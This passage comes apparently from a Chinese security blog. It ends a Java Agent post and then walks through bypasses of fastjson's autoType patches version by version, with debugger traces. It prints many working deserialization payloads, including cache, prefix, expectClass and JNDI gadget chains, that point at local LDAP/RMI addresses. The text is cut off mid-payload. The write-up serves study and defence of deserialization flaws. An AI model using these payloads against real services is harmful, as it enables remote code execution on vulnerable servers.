class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>vmd<span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>virtualMachine<span class="token punctuation">.</span><span class="token function">loadAgent</span><span class="token punctuation">(</span>agentJar<span class="token punctuation">)</span><span class="token punctuation">;</span>virtualMachine<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"attached pid "</span><span class="token operator">+</span>vmd<span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"attached jar "</span><span class="token operator">+</span>agentJar<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><img src="/img/5-4/9.png"><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>大多数情况下，我们使用 Instrumentation 都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：<br>premain 和 agentmain 两种方式<strong>修改字节码</strong>的时机都是类文件加载之后，也就是说必须要带有 Class 类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。<br>类的字节码修改称为类转换 (Class Transform)，类转换其实最终都回归到类重定义 Instrumentation#redefineClasses 方法，此方法有以下限制：</p><ol><li>新类和老类的父类必须相同</li><li>新类和老类实现的接口数也要相同，并且是相同的接口</li><li>新类和老类访问符必须一致。 新类和老类字段数和字段名要一致</li><li>新类和老类新增或删除的方法必须是 private static/final 修饰的</li><li>可以修改方法体</li></ol><h2 id="Maven插件"><a href="#Maven插件" class="headerlink" title="Maven插件"></a>Maven插件</h2><p>不去手动写MANIFREST.MF文件的方式，使用maven插件：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>maven-jar-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>archive</span><span class="token punctuation">&gt;</span></span>      <span class="token comment">&lt;!--自动添加META-INF/MANIFEST.MF --&gt;</span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manifest</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>addClasspath</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>addClasspath</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manifest</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manifestEntries</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Agent-Class</span><span class="token punctuation">&gt;</span></span>com.yyjccc.EvalAgent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Agent-Class</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Can-Redefine-Classes</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Can-Redefine-Classes</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Can-Retransform-Classes</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Can-Retransform-Classes</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manifestEntries</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>archive</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span></code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://paoka1.top/2023/04/07/Java-Agent-%E5%85%A5%E9%97%A8/">Java Agent 入门</a></li><li><a href="https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">Java Agent 内存马学习 | Drunkbaby’s Blog</a></li><li><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html">https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html</a></li><li><a href="https://xz.aliyun.com/t/9450?time__1311=n4+xuDgD9Ad40lDl=oGkYD8jNeiI=NdG8eD">Java Agent 从入门到内存马 - 先知社区</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> Agent </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson高版本补丁绕过</title>
      <link href="/2024/04/27/fastjson%E9%AB%98%E7%89%88%E6%9C%AC%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87/"/>
      <url>/2024/04/27/fastjson%E9%AB%98%E7%89%88%E6%9C%AC%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="fastjson高版本补丁绕过"><a href="#fastjson高版本补丁绕过" class="headerlink" title="fastjson高版本补丁绕过"></a>fastjson高版本补丁绕过</h1><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><h3 id="1-2-25"><a href="#1-2-25" class="headerlink" title="1.2.25"></a>1.2.25</h3><p>在 Fastjson1.2.25 中使用了 checkAutoType 来修复1.2.22-1.2.24中的漏洞，其中有个 autoTypeSupport 默认为 False。当 autoTypeSupport 为 False 时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错。当 autoTypeSupport 为 True 时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤。对于开启或者不开启，都有相应的绕过方法。</p><p>在获取@type的值后，1.2.24以后的版本新增函数checkAutoType,在类加载之前检查是否允许加载<br><img src="/img/24-7-18/1.png"><br>进入ParseConfig#checkAutoType<br>在尝试取缓存无法取到的时候，<br>先进行黑名单过滤，类名不能是以黑名单的开头<br><img src="/img/24-7-18/2.png"><br>黑名单<br><img src="/img/24-7-18/3.png"><br>那基本就是被黑名单限制了，导致异常提前退出异常<br>若是手动开启了AutoType，那么就是先白名单，再黑名单，再取缓存<br><img src="/img/24-7-18/4.png"><br>流程图<br><img src="/img/24-7-18/5.png"></p><h3 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h3><p>1.2.42相较于之前的版本，关键是在ParserConfig.java中修改了以下两点</p><ul><li>黑名单改为了hash值，防止绕过</li><li>对于传入的类名，删除开头L和结尾的;</li></ul><p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究 ( 可恶（:  ），提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<br><a href="https://github.com/LeadroyaL/fastjson-blacklist">GitHub - LeadroyaL/fastjson-blacklist</a></p><img src="/img/24-7-18/6.png">首先第一步就是各种运算，起初还没看懂在干什么，感觉就是给读者做混淆应该与下面的if条件是一样的<img src="/img/24-7-18/7.png">白名单和黑名单都是采用特殊的运算计算hash，从寻找黑白名单中是否有计算出的hash<img src="/img/24-7-18/8.png"><h3 id="1-2-43"><a href="#1-2-43" class="headerlink" title="1.2.43"></a>1.2.43</h3><p>添加检查<br><img src="/img/24-7-18/9.png"><br>在原本检查L和；基础上检查类名的第二个字符是否为L如果是就直接异常退出<br>就是排除类名是以LL开头的情况，然后再截取</p><h3 id="1-2-48"><a href="#1-2-48" class="headerlink" title="1.2.48"></a>1.2.48</h3><p>并将java.lang.Class类放入了黑名单，这样彻底封死了从mapping中加载恶意类</p><p><strong>设置AutoType</strong><br>默认情况下autoTypeSupport为False，将其设置为True有两种方法：</p><ul><li>JVM启动参数：-Dfastjson.parser.autoTypeSupport=true</li><li>代码中设置：ParserConfig.getGlobalInstance().setAutoTypeSupport(true);，如果有使用非全局ParserConfig则用另外调用setAutoTypeSupport(true);</li></ul><p>之后的payload 有些需要开启AutoType</p><h2 id="无需开启AutoType"><a href="#无需开启AutoType" class="headerlink" title="无需开启AutoType"></a>无需开启AutoType</h2><h3 id="低于1-2-47版本的补丁绕过"><a href="#低于1-2-47版本的补丁绕过" class="headerlink" title="低于1.2.47版本的补丁绕过"></a>低于1.2.47版本的补丁绕过</h3><p>说明：</p><ul><li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li><li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li></ul><p>通过缓存绕过，payload如下：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"a"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"b"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>    <span class="token property">"DataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:8085/dzJvybqs"</span><span class="token punctuation">,</span>    <span class="token property">"AutoCommit"</span><span class="token operator">:</span><span class="token boolean">false</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>payload主要是分为两部分<br>调式<br>第一部分：<br>首先java.lang.Class是默认支持的类，所以可以直接从白名单IdentityHashMap中拿出<br>从白名单中拿出的类默认是MiscCodec这个类来进行反序列化<br> MiscCodec#deserialze方法中默认是往下读取val属性<br><img src="/img/24-7-18/10.png"><br>然后解析json得到val属性的值<br>然后加载val对应值的类<br><img src="/img/24-7-18/11.png"><br>在加载类的时候，把对应类加载后，放入mapping缓存，这也是绕过的关键–放入mapping缓存<br><img src="/img/24-7-18/12.png"></p><p>第二部分<br>直接先从缓存中获取<br><img src="/img/24-7-18/13.png"><br>因为之前加载前面的类的时候已经放入过mapping了，所以这里能够直接拿到<br><img src="/img/24-7-18/14.png"><br>拿到class后就会直接返回，就不会走到后面触发异常</p><h3 id="低于1-2-68版本的补丁绕过"><a href="#低于1-2-68版本的补丁绕过" class="headerlink" title="低于1.2.68版本的补丁绕过"></a>低于1.2.68版本的补丁绕过</h3><p>条件</p><ul><li>Fastjson &lt;= 1.2.68</li><li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中</li></ul><p>1.2.68版本后，fastjson新增safemode模式，可以完全关闭AutoType：<br><a href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode">https://github.com/alibaba/fastjson/wiki/fastjson_safemode</a></p><p>本次绕过checkAutoType()函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类或实现类来实现绕过checkAutoType()函数执行恶意操作。<br>简单地说，本次绕过checkAutoType()函数的攻击步骤为：</p><ol><li>先传入某个类，其加载成功后将作为expectClass参数传入checkAutoType()函数；</li><li>查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或setter方法中存在危险操作则可以被攻击利用；</li></ol><p>假设现在已知这个类（这里我们就自己写一个）<br><img src="/img/24-7-18/15.png"><br>payload如下：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.example.VulAutoCloseable"</span><span class="token punctuation">,</span><span class="token property">"cmd"</span><span class="token operator">:</span><span class="token string">"calc"</span><span class="token punctuation">}</span></code></pre><p>后面获取到JavaBeanDeserializer,直接看deserialze方法<br><img src="/img/24-7-18/16.png"><br>此时已经是已经加载了前面的java.lang.AutoCloseable，所以这里expectClass不为空<br><img src="/img/24-7-18/17.png"><br>在这里expectClassFlag设置为true<br>到后面<br><img src="/img/24-7-18/18.png"><br>然后loadClass返回<br><img src="/img/24-7-18/19.png"><br>然后还是会检查是否为被ban的相关类,判断目标类是否是expectClass类的子类，是的话就添加到Mapping缓存中并直接返回该目标类，否则直接抛出异常导致利用失败，<strong>这里就解释了为什么恶意类必须要继承AutoCloseable接口类，因为这里expectClass为AutoCloseable类、因此恶意类必须是AutoCloseable类的子类才能通过这里的判断</strong>：<br><img src="/img/24-7-18/20.png"><br>总结：第一个 <code>@type</code> 进去什么都没有发生；但是第一个 <code>@type</code> 是作为第二个指定的类里面的 expectClass。所以说白了，loadClass 去作用的类是第一个 <code>@type</code>；如果这个 <code>@type</code> 是可控的恶意类，可以造成命令执行攻击。<br>并且需要加载的目标类是expectClass类的子类或者实现类时（不在黑名单中）</p><p>这里直接参考<a href="https://b1ue.cn/archives/364.html">b1ue大佬文章</a>，主要是寻找关于输入输出流的类来写文件，IntputStream和OutputStream都是实现自AutoCloseable接口的。<br>,相关实际应用为利用fastjson写文件，参考：<a href="https://www.yuque.com/yyjccc/pk74ko/de45vsli00bmwtuh">https://www.yuque.com/yyjccc/pk74ko/de45vsli00bmwtuh</a></p><p>看GitHub官方的diff，主要在ParserConfig.java中：<a href="https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4">https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4</a><br>对比看到expectClass的判断逻辑中，对类名进行了Hash处理再比较哈希黑名单，并且添加了三个类：<br><img src="/img/24-7-18/21.png"><br>网上已经有了利用彩虹表碰撞的方式得到的新添加的三个类分别为：</p><table><thead><tr><th><strong>版本</strong></th><th><strong>十进制Hash值</strong></th><th><strong>十六进制Hash值</strong></th><th><strong>类名</strong></th></tr></thead><tbody><tr><td>1.2.69</td><td>5183404141909004468L</td><td>0x47ef269aadc650b4L</td><td>java.lang.Runnable</td></tr><tr><td>1.2.69</td><td>2980334044947851925L</td><td>0x295c4605fd1eaa95L</td><td>java.lang.Readable</td></tr><tr><td>1.2.69</td><td>-1368967840069965882L</td><td>0xed007300a7b227c6L</td><td>java.lang.AutoCloseable</td></tr></tbody></table><p>这就简单粗暴地防住了这几个类导致的绕过问题了。</p><h2 id="需要开启AutoType"><a href="#需要开启AutoType" class="headerlink" title="需要开启AutoType"></a>需要开启AutoType</h2><h3 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25-1.2.41绕过"></a>1.2.25-1.2.41绕过</h3><p>做法：在@type指定的类前加上’L’,后面加上’;’<br>如：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>"     <span class="token string">"\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\","</span> +    <span class="token string">"\"dataSourceName\":\"ldap://127.0.0.1:9999/EXP\", "</span> +    <span class="token string">"\"autoCommit\":true"</span> "<span class="token punctuation">}</span><span class="token comment">//其他利用链也同理</span></code></pre><p>这样绕过了黑名，看看怎么加载类的</p><p>流程<br>在ParseConfig#checkAutoType中<br>由于开启autoTypeSupport所以其为True，能通过黑名单<br>到达<br><img src="/img/24-7-18/22.png"><br>跟进<br><img src="/img/24-7-18/23.png"><br>发现类名要是以L开头并且以；结尾就会去除这些字符再递归调用<br>上面流程又得到了未变化之前的类名，可以正常的加载<br><img src="/img/24-7-18/24.png"></p><h3 id="1-2-42绕过"><a href="#1-2-42绕过" class="headerlink" title="1.2.42绕过"></a>1.2.42绕过</h3><p>做法：在@type指定的类前加上两个’L’,后面加上两个’;’<br>如：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>"     <span class="token string">"\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\","</span> +    <span class="token string">"\"dataSourceName\":\"ldap://127.0.0.1:9999/EXP\", "</span> +    <span class="token string">"\"autoCommit\":true"</span> "<span class="token punctuation">}</span><span class="token comment">//其他利用链也同理</span></code></pre><img src="/img/24-7-18/25.png">这里只截取了一次，所以可以再套一层，类名前面两个L后面两个；<p>由于是递归使用的loadClass所以可以去除两层<br><img src="/img/24-7-18/26.png"></p><h3 id="1-2-43绕过"><a href="#1-2-43绕过" class="headerlink" title="1.2.43绕过"></a>1.2.43绕过</h3><p>操作: 类名前添加’[‘，类名引号外添加’ [{ ‘</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"[com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token punctuation">,</span>    <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1399/Exploit"</span><span class="token punctuation">,</span>     <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token comment">//其他利用链也同理</span></code></pre><p>利用前面1.2.41的类似的还有一个if条件，就是以[开头,<br>尝试直接以[开头，报错<br><img src="/img/24-7-18/27.png"><br>根据报错JdbcRowSetImpl” 后面期望是[而不是’,’那就满足他，在’,’前添加[<br>还是报错<br><img src="/img/24-7-18/28.png"><br>继续添加{<br>执行成功<br><img src="/img/24-7-18/29.png"></p><p>与之前不同的是，进入的是前面的一个if条件<br><img src="/img/24-7-18/30.png"></p><p>最后得到的类是一个数组类<br><img src="/img/24-7-18/31.png"><br>获取到的反序列就是ObjectArrayCodec<br><img src="/img/24-7-18/32.png"><br>继续跟进<br><img src="/img/24-7-18/33.png"><br>获取具体的类<br>创建数组JSONArray<br>然后parseArray<br><img src="/img/24-7-18/34.png"><br>后面的流程应该就一样了</p><h3 id="1-2-45绕过-MyBatis-JNDI注入链"><a href="#1-2-45绕过-MyBatis-JNDI注入链" class="headerlink" title="1.2.45绕过(MyBatis JNDI注入链)"></a>1.2.45绕过(MyBatis JNDI注入链)</h3><p>1.2.45版本添加了一些黑名单，但是存在组件漏洞，我们能通过mybatis组件进行JNDI接口调用，进而加载恶意类。</p><p><strong>条件</strong>:</p><ul><li>高版本开启AutoType</li><li>mybatis相关依赖<pre class="language-json" data-language="json"><code class="language-json">&lt;dependency&gt;        &lt;groupId&gt;org.mybatis&lt;/groupId&gt;        &lt;artifactId&gt;mybatis&lt;/artifactId&gt;        &lt;version&gt;<span class="token number">3.5</span>.<span class="token number">6</span>&lt;/version&gt;    &lt;/dependency&gt;</code></pre></li></ul><p><strong>poc</strong></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span><span class="token punctuation">,</span>    <span class="token property">"properties"</span><span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token property">"data_source"</span><span class="token operator">:</span><span class="token string">"ldap://127.0.0.1：9999/EXP"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>过程<br>触发setter方法<br>JndiDataSourceFactory#setProperties方法<br><img src="/img/24-7-18/35.png"><br>传入的参数刚好就是键值对<br>这里会初始化上下文环境<br>然后就行look<br>look查询的是键值对（Properties）中key为data_source的值<br><img src="/img/24-7-18/36.png"></p><h3 id="1-2-62-1-2-68版本"><a href="#1-2-62-1-2-68版本" class="headerlink" title="1.2.62-1.2.68版本"></a>1.2.62-1.2.68版本</h3><h4 id="1-2-62"><a href="#1-2-62" class="headerlink" title="1.2.62"></a>1.2.62</h4><p>条件：</p><ul><li>需要开启AutoType；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>目标服务端需要存在xbean-reflect包</li></ul><p>也是新 Gadget 绕过黑名单限制。<br>依赖</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.xbean<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>xbean-reflect<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.18<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>  </code></pre><p><strong>分析</strong>：<br>org.apache.xbean.propertyeditor.JndiConverter  类的 toObjectImpl() 函数存在 JNDI 注入漏洞，可由其构造函数处触发利用。<br><img src="/img/24-7-18/37.png"></p><p>触发点在其父类AbstractConverter 的setAsText中<br><img src="/img/24-7-18/38.png"></p><p>toObject 又调用toObjectImpl<br><img src="/img/24-7-18/39.png"><br><strong>poc</strong></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.xbean.propertyeditor.JndiConverter"</span><span class="token punctuation">,</span><span class="token property">"AsText"</span><span class="token operator">:</span><span class="token string">"ldap://127.0.0.1:8085/tmuCzovY"</span><span class="token punctuation">}</span></code></pre><h4 id="1-2-66"><a href="#1-2-66" class="headerlink" title="1.2.66"></a>1.2.66</h4><p><strong>条件</strong></p><ul><li>开启AutoType；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</li><li>br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；</li><li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</li></ul><p>org.apache.shiro.realm.jndi.JndiRealmFactory类PoC：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.shiro.realm.jndi.JndiRealmFactory"</span><span class="token punctuation">,</span> <span class="token property">"jndiNames"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token property">"Realms"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>br.com.anteros.dbcp.AnterosDBCPConfig类PoC：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"br.com.anteros.dbcp.AnterosDBCPConfig"</span><span class="token punctuation">,</span><span class="token property">"metricRegistry"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">}</span>或<span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"br.com.anteros.dbcp.AnterosDBCPConfig"</span><span class="token punctuation">,</span><span class="token property">"healthCheckRegistry"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">}</span></code></pre><p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类PoC：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig"</span><span class="token punctuation">,</span><span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.util.Properties"</span><span class="token punctuation">,</span>"UserTra</code></pre><h4 id="1-2-67"><a href="#1-2-67" class="headerlink" title="1.2.67"></a>1.2.67</h4><p><strong>条件</strong>：</p><ul><li>开启AutoType；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</li><li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；</li></ul><p>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup"</span><span class="token punctuation">,</span> <span class="token property">"jndiNames"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token property">"tm"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.tm"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>org.apache.shiro.jndi.JndiObjectFactory类PoC：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.shiro.jndi.JndiObjectFactory"</span><span class="token punctuation">,</span><span class="token property">"resourceName"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">,</span><span class="token property">"instance"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.instance"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="其他一些绕过黑名单的Gadget"><a href="#其他一些绕过黑名单的Gadget" class="headerlink" title="其他一些绕过黑名单的Gadget"></a>其他一些绕过黑名单的Gadget</h2><p>这里补充下其他一些Gadget，可自行尝试。注意，均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制。</p><h3 id="1-2-59"><a href="#1-2-59" class="headerlink" title="1.2.59"></a>1.2.59</h3><p>com.zaxxer.hikari.HikariConfig类PoC：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.zaxxer.hikari.HikariConfig"</span><span class="token punctuation">,</span><span class="token property">"metricRegistry"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">}</span>或<span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.zaxxer.hikari.HikariConfig"</span><span class="token punctuation">,</span><span class="token property">"healthCheckRegistry"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">}</span></code></pre><h3 id="1-2-61"><a href="#1-2-61" class="headerlink" title="1.2.61"></a>1.2.61</h3><p>org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：<br><strong>JSON</strong></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.proxy.provider.remoting.SessionBeanProvider"</span><span class="token punctuation">,</span><span class="token property">"jndiName"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">,</span><span class="token property">"Object"</span><span class="token operator">:</span><span class="token string">"a"</span><span class="token punctuation">}</span></code></pre><h3 id="1-2-62-1"><a href="#1-2-62-1" class="headerlink" title="1.2.62"></a>1.2.62</h3><p>org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：<br><strong>JSON</strong></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.cocoon.components.slide.impl.JMSContentInterceptor"</span><span class="token punctuation">,</span> <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.util.Hashtable"</span><span 